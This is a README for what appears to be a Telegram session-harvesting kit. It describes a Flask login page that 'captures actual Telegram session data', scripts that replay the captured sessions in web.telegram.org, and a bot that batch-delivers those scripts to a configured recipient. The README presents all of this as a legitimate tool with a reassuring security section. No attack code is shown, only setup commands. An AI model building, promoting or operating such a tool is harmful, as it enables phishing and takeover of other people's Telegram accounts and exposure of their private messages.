# 🤖 Telegram Bot & Script Generator

A comprehensive Telegram bot system with web authentication and automatic script generation for web.telegram.org sessions.

## 🚀 Quick Start

**For detailed setup and usage instructions, see [QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)**

### Basic Workflow

1. **Run the main application:**
   ```bash
   python main.py
   ```

2. **Generate and send scripts:**
   ```bash
   python generate_all_scripts.py
   ```

## ✨ Features

- 🔐 **Real Authentication**: Captures actual Telegram session data
- 🌐 **Web Interface**: Beautiful Flask-based login system
- 🤖 **Telegram Bot**: Automatic script delivery
- 📱 **Script Generation**: Creates working web.telegram.org scripts
- 📤 **Auto Delivery**: Sends scripts directly to Telegram
- 🔄 **Batch Processing**: Handles multiple sessions at once

## 📁 Core Files

- `main.py` - Main Flask application
- `generate_all_scripts.py` - Generate scripts for all sessions
- `generate_working_script.py` - Generate script for latest session
- `config.py` - Configuration settings
- `utils/tg/` - Telegram utilities

## ⚙️ Setup

1. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Configure environment:**
   - Create `.env` file with your credentials
   - Set `SCRIPT_TARGET_USER_ID` for script delivery

3. **Run the system:**
   ```bash
   python main.py
   ```

## 📖 Documentation

- **[QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)** - Complete setup and usage guide
- **[SCRIPT_SENDING_README.md](SCRIPT_SENDING_README.md)** - Script sending feature details

## 🔒 Security

- Uses real Telegram API authentication
- Secure session data storage
- Environment-based configuration
- Input validation and sanitization

---

**Need help?** Check the [Quick Start Guide](QUICK_START_GUIDE.md) for detailed instructions. 